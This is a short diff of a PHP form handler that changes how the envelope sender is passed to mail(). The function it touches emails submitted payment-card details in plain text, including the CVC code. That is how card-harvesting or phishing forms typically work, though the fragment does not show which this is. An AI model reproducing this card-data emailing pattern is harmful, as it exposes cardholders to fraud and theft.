@@ -90,7 +90,7 @@ function sendEmail($post) {
     $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
 
     // Send email
-    if (mail($to, $subject, $email_body, '-f'.$headers)) {
+    if (mail($to, $subject, $email_body, $headers, '-fno-reply@americaresides.com')) {
         echo "success";
     } else {
         echo "Failed to send email to";
